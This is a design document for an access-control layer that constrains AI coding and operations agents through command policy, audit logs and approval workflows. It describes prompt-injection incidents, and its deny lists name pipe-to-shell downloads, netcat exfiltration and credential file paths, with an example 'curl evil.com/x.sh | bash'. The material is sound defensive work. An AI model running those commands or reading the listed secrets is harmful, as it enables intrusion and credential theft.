# Secure AI Agent Access — Remote and Local

Structured access control for AI agents — Claude, GPT-based assistants, autonomous coding agents, operational AI systems — with command-level policy, complete audit trails, cryptographic identity, and safety constraints that agents cannot bypass, uniformly across remote and local execution.

## The Problem

AI agents have moved from experimental to operational in 2025-2026. Code assistants execute terminal commands. Operational AI agents manage infrastructure. Customer support agents query databases. Research agents fetch data from internal systems. Local development agents run tests, install dependencies, modify files on the developer's machine. Each requires real access to real systems to provide real value — and each carries real risk.

### Two distinct but related problems

```
┌─────────────────────────────────────────────────────────────────┐
│  Problem 1: REMOTE ACCESS                                       │
│  Agent needs to interact with infrastructure not on local host  │
│                                                                 │
│  Examples:                                                      │
│  - Operational agent managing Kubernetes clusters               │
│  - Database admin agent querying production PostgreSQL          │
│  - Security agent investigating compromised servers             │
│  - Research agent fetching from internal data sources           │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│  Problem 2: LOCAL ACCESS                                        │
│  Agent needs to execute commands on the same machine it's       │
│  running on (or that it's connected to as a tool runtime)       │
│                                                                 │
│  Examples:                                                      │
│  - Claude Code, Cursor, Aider, GitHub Copilot Agent             │
│  - Autonomous coding agents on developer workstations           │
│  - CI/CD agents that run tests, build, deploy                   │
│  - Personal assistant agents managing files and calendar        │
│  - Penetration testing agents exploring local networks          │
└─────────────────────────────────────────────────────────────────┘
```

These problems share more than they differ. Both involve an agent that:
- Cannot be fully trusted to make safe decisions
- Generates commands or API calls based on natural-language reasoning
- May be manipulated by prompt injection
- Operates at machine speed when things go wrong
- Requires audit-grade traceability for compliance and incident response

### Specific failure modes

**Hallucination at scale.** AI agents confidently generate plausible-looking commands that are wrong. A code agent asked to "clean up old log files" might hallucinate `rm -rf /var/log/*` and execute it without hesitation. A coding agent asked to "remove unused dependencies" might delete files it misclassifies. The confidence with which agents do wrong things is what makes them dangerous.

**Prompt injection.** Adversarial inputs hidden in data the agent processes can manipulate it into executing attacker-chosen commands. A document containing malicious instructions becomes an attack vector when the agent has shell access. A repository's README, a webpage the agent fetches, an email the agent processes — all become potential injection points.

**Scope creep.** Agents asked for one thing reach for adjacent capabilities. "Update the README" becomes "delete unused files I think are irrelevant" becomes "the production database backup looked unused."

**Lateral movement.** An agent compromised through prompt injection can use its access to extract secrets, escalate privileges, or pivot to other systems — exactly like a human attacker with stolen credentials, but operating at machine speed.

**Audit invisibility.** When something goes wrong, reconstructing what the agent did requires correlating logs from many tools. The chain of reasoning that led to the destructive action is often lost entirely. Most current agent runtimes do not record the agent's intent, only the executed commands.

**Lack of human-in-loop for sensitive operations.** The agent decides what needs approval, which means the agent decides what doesn't need approval.

**Cross-tenant contamination.** When multiple users share an agent runtime (SaaS coding assistants, shared CI agents), one user's data or credentials can leak to another's session through the agent's memory or working directory state.

### Real incidents (anonymized)

- A coding agent given Git access force-pushed to main, destroying days of team work, while attempting to "clean up commits"
- An operational agent given AWS credentials terminated production EC2 instances when interpreting an ambiguous instruction about "scaling down"
- A documentation agent with database read access leaked customer PII into generated documentation by interpreting "include relevant data" too broadly
- A code review agent processing a malicious PR description executed embedded shell commands that exfiltrated environment variables
- A local coding agent ran `npm install` on a typo-squatted package that installed a credential stealer; the agent had no awareness that this was unusual
- A monitoring agent accidentally created a tight loop that DOS'd internal APIs trying to "investigate" a transient error

These incidents are not failures of AI capability. They are failures of access control. The agents did exactly what their access permitted them to do.

### Traditional mitigations and why they're insufficient

**"Just don't give the agent access."** Then the agent isn't useful for the operational work where it provides the most value.

**"Manually review every agent action."** This defeats the purpose. If a human must approve each command, the agent is just a slow human assistant.

**"Use IAM roles with limited scope."** IAM operates at the API level. It cannot distinguish between `kubectl get pods` (safe) and `kubectl delete namespace production` (catastrophic) — both are within "kubectl access."

**"Sandbox the agent in a container."** Sandboxes that prevent damage also prevent useful work. The agent needs network access to do anything meaningful, and network access is the primary attack surface.

**"Use AI guardrails / content filtering."** These detect obvious bad patterns but cannot understand context. They block "rm -rf /" but not "find / -name '*.log' -mtime +30 -delete" which is rarely what was intended.

**"Trust but verify."** Verification after the fact does not prevent damage. By the time you notice the database is dropped, it is dropped.

---

## How RavenFabric Solves It

RavenFabric provides AI agents with a structured access layer that enforces safety constraints the agent cannot bypass — uniformly across remote and local execution.

The core insight: **transport is incidental.** Whether the agent's command travels over WireGuard to a remote server or over a Unix socket to a local process, the same policy engine, audit log, and identity verification apply.

```
                    AI agent (any kind)
                          │
                          │  Agent decides what to do
                          │  Agent generates command intent
                          ▼
              ┌──────────────────────┐
              │  Two access paths:   │
              │  A) Native skill use │     B) MCP server interface
              │     `rf exec ...`    │        ravenfabric_mcp_tool(...)
              └──────────────────────┘
                          │
                          ▼
              RavenFabric Policy Layer
                          │
                          │  ├─ Validate against agent-specific policy
                          │  ├─ Apply approval workflow if required
                          │  ├─ Enforce blast radius limits
                          │  ├─ Check rate limits and resource quotas
                          │  └─ Refuse if outside allowed scope
                          │
                          ▼
              Agent identity (cryptographic key)
                          │
                          ▼
        ┌─────────────────┴────────────────┐
        │                                  │
        ▼                                  ▼
┌──────────────────┐          ┌──────────────────────┐
│ REMOTE EXEC      │          │ LOCAL EXEC           │
│                  │          │                      │
│ Noise XX over    │          │ Noise XX over        │
│ network          │          │ Unix socket          │
│                  │          │ (same machine)       │
│ Production       │          │ Local processes,     │
│ servers, K8s,    │          │ files, capabilities  │
│ databases, etc.  │          │                      │
└──────────────────┘          └──────────────────────┘
                          │
                          ▼
              Complete audit trail (uniform):
              ├─ What the agent asked for
              ├─ What policy decided
              ├─ What was executed (or denied)
              ├─ What the result was
              └─ All cryptographically signed
```

### What this provides

| Capability | Description |
|------------|-------------|
| **Cryptographic agent identity** | Each agent instance has a unique key, not an API token |
| **Command-level policy** | Allow/deny patterns at the actual operation level, not API level |
| **Uniform local and remote** | Same policy, audit, and crypto whether agent acts on local or remote system |
| **Replay-grade audit** | Every command, decision, and result recorded — including agent reasoning if provided |
| **Approval workflows** | Sensitive operations escalate to human review automatically |
| **Blast radius limits** | Resource and time quotas prevent runaway behavior |
| **Instant revocation** | Agent identity revocation cuts off access in milliseconds, not hours |
| **Tamper-evident** | Audit log entries are cryptographically chained |
| **Per-agent isolation** | Multiple agents do not share state or credentials |
| **Prompt-injection resistant** | Policy is enforced regardless of agent reasoning |
| **No bypass via shell escape** | Agent receives results, not shell access |

---

## Architecture: Two Access Paths

RavenFabric supports AI agent integration through two complementary mechanisms, each suited to different deployment patterns.

### Path A: Native skill use

The agent learns to use `rf` as a command-line tool, the same way a human operator would. This is appropriate when:

- The agent has shell tool access already (Claude Code, Cursor, Aider, etc.)
- The deployment wants minimal new infrastructure
- The agent's reasoning around CLI usage is sufficient for the use case

```
┌─────────────────────────────────────────────────────────┐
│  Claude / Cursor / Aider / Custom agent                 │
│                                                         │
│  Agent context includes "ravenfabric" skill:            │
│   - How to invoke rf commands                           │
│   - What policies apply                                 │
│   - How to interpret denials                            │
│   - When to ask for approval                            │
└─────────────────┬───────────────────────────────────────┘
                  │  shell tool execution
                  ▼
        ┌─────────────────┐
        │   `rf exec ...` │  CLI binary
        └─────────┬───────┘
                  │  Noise XX
                  ▼
        ┌─────────────────┐
        │ rf-agent (local │  validates, executes,
        │  or remote)     │  audits — same as if
        └─────────────────┘  human invoked it
```

A skill file (added to agent context) might look like:

```markdown
# RavenFabric Access Skill

You have access to the `rf` command-line tool. This is the only sanctioned
way to interact with infrastructure systems.

## When to use rf
- Use `rf exec <target> "<command>"` to run commands on registered systems
- Use `rf state apply <file>` to apply declarative state
- Use `rf shell <target>` only when interactive debugging is needed

## What you cannot do
- You cannot bypass rf by using ssh, kubectl, docker, or other tools directly
- These tools are not on your PATH for a reason
- If rf denies your command, do not try to work around it — report to user

## How to handle denials
When rf returns "DENIED", the response includes:
  - Which rule matched
  - Why the rule exists
  - Whether approval can override

If approval can override, ask the user explicitly:
  "This action requires human approval because [reason].
   Would you like me to request approval?"

## Reading audit context
You can run `rf audit my-recent` to see your own recent actions.
This is helpful for understanding what you've already done in a session.
```

### Path B: MCP server interface

RavenFabric exposes a Model Context Protocol (MCP) server that AI clients connect to. This is appropriate when:

- The agent platform supports MCP natively (Claude Desktop, Claude Code, etc.)
- Structured tool calls are preferred over CLI parsing
- Multiple agents need to share a single RavenFabric configuration

```
┌─────────────────────────────────────────────────────────┐
│  AI client (Claude Desktop, IDE extension, custom)      │
│                                                         │
│  MCP client connects to RavenFabric MCP server:        │
│   - List available tools                               │
│   - Each tool corresponds to an rf operation           │
│   - Tools include schema + policy summary              │
└─────────────────┬───────────────────────────────────────┘
                  │  MCP protocol (JSON-RPC over stdio/socket)
                  ▼
        ┌─────────────────────────┐
        │  rf-mcp-server          │
        │  (translates MCP tool   │
        │   calls to rf commands) │
        └────────┬────────────────┘
                 │
                 ▼
        ┌────────────────┐
        │   rf-agent     │
        └────────────────┘
```

The MCP server exposes tools the agent can call:

```json
{
  "tools": [
    {
      "name": "rf_exec",
      "description": "Execute a command on a target system. All commands are policy-validated; some may require approval.",
      "inputSchema": {
        "type": "object",
        "properties": {
          "target": { "type": "string", "description": "Target system identifier (e.g., 'prod-web-1' or 'local')" },
          "command": { "type": "string", "description": "Command to execute" },
          "reason": { "type": "string", "description": "Why you want to run this. Recorded in audit log." }
        },
        "required": ["target", "command"]
      }
    },
    {
      "name": "rf_query_policy",
      "description": "Check if a command would be allowed before executing it. Useful for planning.",
      "inputSchema": {
        "type": "object",
        "properties": {
          "target": { "type": "string" },
          "command": { "type": "string" }
        },
        "required": ["target", "command"]
      }
    },
    {
      "name": "rf_request_approval",
      "description": "Request human approval for an operation that requires it.",
      "inputSchema": {
        "type": "object",
        "properties": {
          "target": { "type": "string" },
          "command": { "type": "string" },
          "justification": { "type": "string" }
        },
        "required": ["target", "command", "justification"]
      }
    },
    {
      "name": "rf_list_my_capabilities",
      "description": "List the tools and targets this agent has access to.",
      "inputSchema": { "type": "object" }
    }
  ]
}
```

---

## Local-to-Local: The Sandbox Alternative

The most underappreciated capability of RavenFabric is **local-to-local operation**: using the same fabric architecture to control what an AI agent can do on the machine it's running on.

This addresses a category of problems that conventional sandboxes handle poorly:

- Sandboxes block too much (no network, no file access)
- Sandboxes block too little (within sandbox, agent has full control)
- Sandboxes have no audit (operations within sandbox are opaque)
- Sandboxes have no policy nuance (binary allow/deny per resource type)

### How local-to-local works

```
┌─────────────────────────────────────────────────────────────┐
│  Developer workstation                                      │
│                                                             │
│  ┌─────────────────────────────────────────────────────┐   │
│  │  AI Agent (Claude Code, Cursor, Aider, etc.)        │   │
│  │                                                     │   │
│  │  Agent's tool runtime configured to use rf:         │   │
│  │   - shell tool wraps rf exec                        │   │
│  │   - file edit tool wraps rf file-edit               │   │
│  │   - process tool wraps rf process                   │   │
│  └─────────────────┬───────────────────────────────────┘   │
│                    │                                        │
│                    │ Unix socket (Noise XX)                 │
│                    │ /var/run/ravenfabric/local.sock        │
│                    │                                        │
│                    ▼                                        │
│  ┌─────────────────────────────────────────────────────┐   │
│  │  rf-agent (local mode)                              │   │
│  │                                                     │   │
│  │  - Listens on Unix socket only                      │   │
│  │  - Cryptographic identity for agent (per session)   │   │
│  │  - Per-agent policy file                            │   │
│  │  - Audit log: ~/.local/share/ravenfabric/audit.jsonl│   │
│  │  - Same engine as remote rf-agent                   │   │
│  └─────────────────┬───────────────────────────────────┘   │
│                    │                                        │
│                    │ Validated execution                    │
│                    ▼                                        │
│  ┌─────────────────────────────────────────────────────┐   │
│  │  Local resources                                    │   │
│  │  - Filesystem (with path-level allow/deny)          │   │
│  │  - Processes (with command-level policy)             │   │
│  │  - Network (with destination-level policy)           │   │
│  │  - Environment variables (with key-level policy)     │   │
│  │  - System info (read-only by default)                │   │
│  └─────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

### Local agent configuration

```yaml
# ~/.config/ravenfabric/local-agent.yaml
agent:
  mode: local

  # Listen only on Unix socket — no network exposure
  transport:
    kind: unix_socket
    path: /var/run/ravenfabric/local.sock
    permissions: 0660
    group: ravenfabric

  # Each AI agent session gets a unique identity
  identity:
    issuance: per_session
    session_ttl_hours: 8
    binding: terminal_session

  # Policy is per-agent-role, not per-process
  policy:
    default_role: untrusted_ai_agent
    role_assignment_path: ~/.config/ravenfabric/agent-roles.yaml

  # Local audit goes to home directory
  audit:
    path: ~/.local/share/ravenfabric/audit.jsonl
    rotation: daily
    retention_days: 90
    forward_to_central: true
```

### Local agent policy example

```yaml
apiVersion: ravenfabric.io/v1alpha1
kind: LocalAgentPolicy
metadata:
  name: untrusted-ai-agent-default
spec:
  role: untrusted_ai_agent

  # Filesystem access
  filesystem:
    allow:
      - path: ${HOME}/projects/${ACTIVE_PROJECT}
        operations: [read, write, create, delete]
      - path: ${HOME}/projects/${ACTIVE_PROJECT}/.git
        operations: [read]
      - path: /etc
        operations: [read]
      - path: /usr
        operations: [read]
      - path: /tmp
        operations: [read, write, create, delete]
        max_size_mb: 1000

    deny:
      - path: ${HOME}/.ssh
      - path: ${HOME}/.aws
      - path: ${HOME}/.gcloud
      - path: ${HOME}/.config/gh
      - path: ${HOME}/.netrc
      - path: ${HOME}/.password-store
      - path: ${HOME}/.gnupg
      - path: ${HOME}/.docker/config.json
      - path: ${HOME}/.kube/config
      - path: /etc/sudoers
      - path: /etc/shadow
      - path: /boot
      - path: /root
      # Other projects (data segregation)
      - path: ${HOME}/projects/*
        operations: [read, write]
        unless_matches: ${ACTIVE_PROJECT}

  # Command execution
  commands:
    allow:
      # Build tools
      - pattern: "^(npm|yarn|pnpm) (install|run|test|build) .*$"
      - pattern: "^cargo (build|test|run|check|fmt|clippy) .*$"
      - pattern: "^go (build|test|run|fmt|vet) .*$"
      - pattern: "^python -m pytest .*$"

      # Read-only inspection
      - pattern: "^git (status|log|diff|show|branch).*$"
      - pattern: "^ls .*$"
      - pattern: "^cat .*$"
      - pattern: "^grep .*$"
      - pattern: "^find .*$"

      # Linting and formatting
      - pattern: "^prettier .*$"
      - pattern: "^eslint .*$"
      - pattern: "^rustfmt .*$"

      # Limited git mutations (with project scope)
      - pattern: "^git add .*$"
      - pattern: "^git commit -m \".*\"$"
      - pattern: "^git checkout -b [a-zA-Z0-9_-]+$"

    deny:
      # Catastrophic operations
      - pattern: ".*rm -rf.*"
      - pattern: ".*rm -r /.*"
      - pattern: "^sudo .*"
      - pattern: "^su .*"

      # Git destructive
      - pattern: "git push .*--force.*"
      - pattern: "git reset --hard.*"
      - pattern: "git clean -fd.*"

      # Network exfiltration patterns
      - pattern: ".*curl.*\\|.*sh.*"
      - pattern: ".*wget.*\\|.*sh.*"
      - pattern: ".*nc -.* .* < .*"

      # Package installation from arbitrary sources
      - pattern: "npm install --registry .*"
      - pattern: "pip install --index-url .*"

      # Environment mutation
      - pattern: ".*export AWS_.*"
      - pattern: ".*export GITHUB_TOKEN.*"

  # Network access (outgoing connections from agent's commands)
  network:
    allow:
      - host: "registry.npmjs.org"
      - host: "*.npmjs.com"
      - host: "pypi.org"
      - host: "*.pythonhosted.org"
      - host: "crates.io"
      - host: "*.crates.io"
      - host: "github.com"
      - host: "*.github.com"
      - host: "docs.rs"

    deny:
      - host_pattern: "^[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+$"
      - host_pattern: ".*\\.ngrok\\.(io|app)$"
      - host_pattern: ".*pastebin.*"
      - host_pattern: ".*requestbin.*"

  # Process management
  processes:
    allow:
      max_concurrent_spawned: 10
      max_total_per_session: 1000
      max_runtime_seconds: 600

    deny:
      - pattern: "^/bin/sh"
      - pattern: "^/bin/bash"
      - pattern: ".*ssh.*"

  # Environment variable access
  environment:
    allow:
      - PATH
      - HOME
      - USER
      - LANG
      - LC_*
      - PWD
      - SHELL
      - TERM

    deny:
      - AWS_*
      - GITHUB_TOKEN
      - OPENAI_API_KEY
      - ANTHROPIC_API_KEY
      - GCLOUD_*
      - AZURE_*

  # Resource limits
  resources:
    max_cpu_percent: 50
    max_memory_mb: 2048
    max_open_files: 100
    max_processes_total: 50

  # Approval requirements
  approval:
    required:
      - command_pattern: "^npm publish .*$"
        approver: terminal_user
      - command_pattern: "^git push origin main"
        approver: terminal_user
      - command_pattern: "^git push origin master"
        approver: terminal_user
      - filesystem_pattern: "${HOME}/.bashrc"
        operations: [write]
        approver: terminal_user

  # Logging
  audit:
    log_every_command: true
    log_every_file_access: true
    log_denials_with_reason: true
    log_agent_reasoning: true
```

### What this prevents

The local agent role definition above prevents the entire class of incidents listed earlier:

- `rm -rf node_modules` — denied: matches catastrophic pattern
- `git push --force` — denied: explicit deny pattern
- Reading `~/.aws/credentials` — denied: filesystem path
- `curl evil.com/x.sh | bash` — denied: pipe-to-shell pattern + network host
- Installing from typo-squatted package source — denied: alternative registry
- Touching SSH keys — denied: filesystem path
- Reading other projects' code — denied: project scope
- Spawning shell escape — denied: process pattern

But still allows useful work:

- Build, test, lint within project
- Read project files, system files
- Make new branches and commits
- Install packages from official registries
- Document and explain code

### Comparison: sandbox vs RavenFabric local

| Capability | Container sandbox | OS-level sandbox | RavenFabric local |
|------------|-------------------|------------------|-------------------|
| **Command-level policy** | No | Syscall filters only | Yes (regex on intent) |
| **Filesystem path policy** | All-or-nothing volumes | Yes | Yes |
| **Network host policy** | All-or-nothing | Partial | Yes (per-host) |
| **Audit per operation** | No | Via auditd | Yes (structured) |
| **Approval workflow** | No | No | Yes |
| **Cryptographic identity** | No | No | Yes |
| **Same policy across local and remote** | No | No | Yes |
| **Resource quotas** | Yes (cgroups) | Partial | Yes |
| **Tamper-evident audit** | No | No | Yes |
| **Easy to inspect/debug** | Partial | No | Yes |

---

## Operator Workflows

### Workflow 1: Setting up Claude Code with RavenFabric

```bash
# Install RavenFabric local agent
$ rf agent install local

[installing rf-agent in local mode...]
[creating socket: /var/run/ravenfabric/local.sock]
[creating audit directory: ~/.local/share/ravenfabric/]
[creating systemd user service]
[starting service]

# Verify it's running
$ rf agent status
[rf-agent local: running]
[socket: /var/run/ravenfabric/local.sock]
[uptime: 12s]
[active sessions: 0]

# Generate identity for Claude Code session
$ rf identity create --name claude-code --role untrusted_ai_agent --ttl 8h
[identity created]
[role: untrusted_ai_agent]
[ttl: 8 hours]
[fingerprint: ec25:f3a9:b2c1:d4e5]
[token: rf-session-abc123def456...]

# Configure Claude Code to use this identity
$ claude-code config set ravenfabric.token rf-session-abc123def456
$ claude-code config set ravenfabric.socket /var/run/ravenfabric/local.sock
$ claude-code config set tools.shell.via_ravenfabric true
[Claude Code will now use rf for all shell commands]
```

### Workflow 2: Watching what an AI agent actually does

```bash
# Live audit stream while Claude Code works
$ rf audit watch --identity claude-code

[2026-05-05 14:32:01] EXEC: "ls -la"  → ALLOWED, exit 0
[2026-05-05 14:32:03] EXEC: "cat README.md"  → ALLOWED, exit 0
[2026-05-05 14:32:15] EXEC: "npm install"  → ALLOWED, exit 0 (12s)
[2026-05-05 14:32:34] EXEC: "npm test"  → ALLOWED, exit 0 (47s)
[2026-05-05 14:33:21] FS_READ: "src/main.ts"  → ALLOWED
[2026-05-05 14:33:22] FS_WRITE: "src/main.ts"  → ALLOWED (modified)
[2026-05-05 14:33:45] EXEC: "git add src/main.ts"  → ALLOWED, exit 0
[2026-05-05 14:33:48] EXEC: "git commit -m 'Fix authentication bug'"  → ALLOWED
[2026-05-05 14:34:02] EXEC: "git push origin main"  → DENIED
                                                       reason: requires approval
                                                       rule: approval.required[1]
[2026-05-05 14:34:15] APPROVAL_REQ: "git push origin main"  → pending user
[2026-05-05 14:34:32] APPROVAL: granted by terminal_user
[2026-05-05 14:34:33] EXEC: "git push origin main"  → ALLOWED, exit 0
```

### Workflow 3: Investigating an incident

```bash
# Coding agent did something unexpected — investigate
$ rf audit query --identity claude-code \
    --since "2026-05-05 14:00" \
    --until "2026-05-05 15:00" \
    --include-reasoning

[156 events in time range]

[14:23:15] AGENT_REASONING: "User asked to clean up log files. I'll find old
                            logs in /var/log and remove them."
[14:23:16] EXEC: "find /var/log -name '*.log' -mtime +30"  → DENIED
                                                              reason: /var/log no write
                                                              rule: filesystem.deny[6]
[14:23:18] AGENT_REASONING: "Direct find blocked. Trying through journalctl."
[14:23:19] EXEC: "journalctl --vacuum-time=30d"  → DENIED
                                                    reason: requires sudo
                                                    rule: commands.deny[3]
[14:23:21] AGENT_REASONING: "Cannot rotate system logs. Asking user for
                            clarification."
[14:23:22] AGENT_OUTPUT: "I cannot rotate system logs from this environment.
                          Could you clarify which logs you meant? If you
                          mean application logs in your project, I can
                          help with those."

# Audit shows policy worked correctly — agent attempted dangerous operations,
# was prevented, asked for clarification.
```

### Workflow 4: Custom policy for a specific agent task

```bash
# Developer wants to give agent expanded permissions for a one-time refactor
$ rf identity create --name claude-refactor \
    --role refactor_session \
    --policy refactor-policy.yaml \
    --ttl 2h

# refactor-policy.yaml expands certain permissions for this session only
[identity created]
[expanded permissions:]
[  - filesystem write to ~/projects/legacy-app (entire tree)]
[  - process: spawn npm with any subcommand]
[  - process: spawn cargo with any subcommand]
[remaining restrictions:]
[  - all credential paths still denied]
[  - all network exfiltration patterns still denied]
[  - approval still required for git push]
[ttl: 2 hours]
[after expiration: identity automatically revoked]
```

### Workflow 5: MCP server for Claude Desktop integration

```json
// ~/.config/claude/claude_desktop_config.json
{
  "mcpServers": {
    "ravenfabric": {
      "command": "rf-mcp-server",
      "args": [
        "--socket", "/var/run/ravenfabric/local.sock",
        "--identity-file", "~/.config/ravenfabric/claude-desktop.identity"
      ]
    }
  }
}
```

When Claude Desktop starts, it connects to the RavenFabric MCP server. Claude sees tools `rf_exec`, `rf_query_policy`, `rf_request_approval`, and `rf_list_my_capabilities`. All actions Claude takes via these tools are policy-validated and audited.

---

## Multi-Agent and Multi-User Patterns

### Pattern A: One agent identity per session

Each invocation of an agent gets its own ephemeral identity. When the session ends, the identity expires. Audit logs are scoped to specific sessions.

Appropriate for individual developer use of coding assistants.

### Pattern B: Long-lived agent identity for autonomous operations

A scheduled or background agent (like a security monitoring AI) gets a long-lived identity bound to a specific operational role. The identity does not expire but can be revoked.

Appropriate for production AI agents that run continuously.

### Pattern C: Per-user agent identities in shared environments

A SaaS coding tool that hosts multiple users gives each user's agent session a unique identity. Even if the underlying agent runtime is shared, audit logs and policy decisions are per-user.

Appropriate for team-shared agent environments.

### Pattern D: Role-based delegation

A senior developer can grant their own AI agent expanded permissions temporarily ("delegate to my agent for the next 2 hours: ability to deploy to staging"). The delegation is itself an auditable RavenFabric operation.

Enables flexible "AI agent acting on behalf of human" patterns without the agent inheriting the human's full permissions permanently.

---

## Compliance and Regulatory Considerations

The audit trail RavenFabric produces for AI agent operations directly addresses emerging regulatory requirements:

### EU AI Act

The EU AI Act (Regulation 2024/1689) requires "high-risk AI systems" to maintain logs of operations, including inputs and outputs, for traceability. RavenFabric's audit logs satisfy this for agents acting on real systems.

### NIS2 / DORA

For AI agents operating in regulated sectors, every action they take must be attributable to a specific identity and traceable in audit logs. RavenFabric produces exactly this evidence.

### Industry-specific

- **Healthcare:** HIPAA audit requirements for systems accessing PHI
- **Finance:** SOX requirements for systems affecting financial reporting
- **Public sector:** FOIA-style traceability for AI-driven decisions
- **Defense:** Various export control and chain-of-custody requirements

---

## Comparison with Alternatives

| Feature | Custom AI sandbox | OS-level sandboxing | API-only access | RavenFabric |
|---------|-------------------|---------------------|-----------------|-------------|
| **Command-level policy** | Custom-built | Syscall level | No | Yes |
| **Same policy local + remote** | No | No | N/A | Yes |
| **Cryptographic identity per session** | No | No | Token-based | Yes |
| **Approval workflow** | Custom | No | No | Yes |
| **Replay-grade audit** | Partial | Partial | Partial | Yes |
| **Tamper-evident logs** | No | No | No | Yes |
| **Resource quotas** | Partial | Partial | No | Yes |
| **Easy policy iteration** | No | No | N/A | Yes (hot-reload) |
| **Multi-tenant by design** | No | No | Partial | Yes |
| **Human in loop integration** | Partial | No | No | Yes |

---

## Implementation Status

### Available today (v0.1)

- Cryptographic identity per agent (Curve25519)
- Policy-validated command execution
- Structured audit logging
- End-to-end encryption (Noise XX)

### Coming in v0.2-v0.3

- Unix socket transport driver (local-to-local mode)
- Per-session identity issuance
- rf-mcp-server (MCP protocol bridge)
- Filesystem-level policy enforcement
- Network destination policy
- Process spawn policy

### Coming in v0.4+

- Approval workflow integration (Slack, email, dedicated UI)
- Agent-specific reasoning capture in audit log
- Capability delegation patterns
- Multi-agent coordination policies
- Anomaly detection on agent behavior
- Standard policy templates for common agent roles

---

## Adoption Path

### Phase 1: Personal use (today)

Individual developers use RavenFabric local mode to constrain coding agents on their workstation. Immediate value: catastrophic mistakes prevented, audit trail of agent actions.

### Phase 2: Team standard (3-6 months)

Engineering teams standardize on RavenFabric for AI agent access. Shared policy templates (e.g., "junior developer agent", "senior developer agent", "production read-only agent"). Centralized audit aggregation for security team review.

### Phase 3: Organization-wide (6-18 months)

Organization-wide policy for AI agent access. Integration with IdP for operator identity. Compliance reporting for AI agent operations. Audit logs feed into SIEM. Approval workflows tied to existing change management.

### Phase 4: Production AI operations (12-24 months)

Autonomous agents running in production use RavenFabric for all infrastructure interactions. Multi-tenant isolation between agent fleets. Approval workflows for sensitive operations route through PagerDuty/Slack.

### Phase 5: Inter-organization (24+ months)

Vendor AI agents that operate inside customer environments use RavenFabric for boundary enforcement. Customer controls what vendor AI can do. Vendor demonstrates security posture via audit trail.

---

## Why This Matters

The shift from "AI agents as research projects" to "AI agents as operational infrastructure" is happening rapidly in 2025-2026. Most organizations deploying AI agents are doing so without adequate access control, because adequate access control did not exist.

The current state of practice — handing AI agents API keys, SSH credentials, or container shells with broad permissions — is approximately equivalent to the state of human credential management before single sign-on, role-based access control, and audit logging became standard. It works until it catastrophically fails.

RavenFabric proposes that AI agent access deserves the same maturity that human access has accumulated over decades:

> **Identity that is cryptographic, not symbolic. Authorization that is command-level, not API-level. Audit that is replay-grade, not summary. Approval workflows that route to humans for sensitive operations. Boundaries that are enforced regardless of agent reasoning.**

For RavenFabric specifically, AI agent access is a remarkably well-aligned use case because:

1. **The architecture already supports it.** Local Unix socket transport is a small extension of the existing transport layer. The policy engine, audit log, and crypto layer apply unchanged.

2. **The market is uncreated.** No established competitor positions for "AI agent access control" specifically. HashiCorp, Teleport, and Tailscale are all human-operator-focused.

3. **The timing is unique.** AI agents are exploding in deployment now. Two years from now, this category will have established players.

4. **The complementarity is strong.** Customers who adopt RavenFabric for AI agent control will naturally extend it to human operator access too. AI agent control is a wedge into broader access management.

---

## See Also

- [CloudNativePG Database Access](cloudnativepg.md) — Remote database access patterns
- [Air-Gapped Industrial Systems](airgapped-ics.md) — Strict access control for sensitive environments
- [MSP Multi-Tenant Operations](msp-multitenant.md) — Per-client isolation patterns
